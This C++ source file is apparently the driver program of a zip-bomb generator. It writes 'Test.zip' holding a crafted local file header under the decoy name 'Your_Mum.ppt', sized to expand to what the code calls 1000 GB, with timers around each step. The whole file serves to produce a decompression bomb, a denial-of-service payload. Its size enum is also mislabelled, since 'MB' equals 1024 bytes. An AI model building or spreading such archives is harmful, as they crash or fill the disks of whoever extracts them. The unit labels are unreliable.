#include <chrono>
#include <fstream>

#include "../include/zip_file_construction/LocalFileHeader.h"
#include "Helper.h"
#include "../include/zip_file_construction/CentralDirectory.h"
#include "Timer.h"
#include "zip_file_construction/ZipFile.h"
#include "deflation/BitWriter.h"
#include "deflation/HuffmanTable.h"
#include <iostream>

namespace {
    enum class ByteSize:size_t {
        MB = 1024,
        GB = MB * 1024,
        TB = GB * 1024,
        PB = TB * 1024
    };
}


int main() {
    try {
        Timer totalRuntime{"Total Runtime"};
        std::string fileName{"Test.zip"};
        std::ofstream out(fileName, std::ios::binary);
        if (!out) {
            std::cout << "Output file failed to open \n";
            return 1;
        }

        LocalFileHeader lfh{};
        {
            Timer localHeaderBomb{"Creating local file header bomb"};
            lfh = LocalFileHeader::createBomb("Your_Mum.ppt", (static_cast<size_t>(ByteSize::GB) * 1000));
        }

        ZipFile zipFile{fileName};
        zipFile.addFile(std::move(lfh));


        {
            Timer zipFileSerialization{"Serializing zip file"};
            auto file{zipFile.serializeTo(out)};
        }
    } catch (std::exception &e) {
        std::cout << "exception: " << e.what() << std::endl;
    }
}
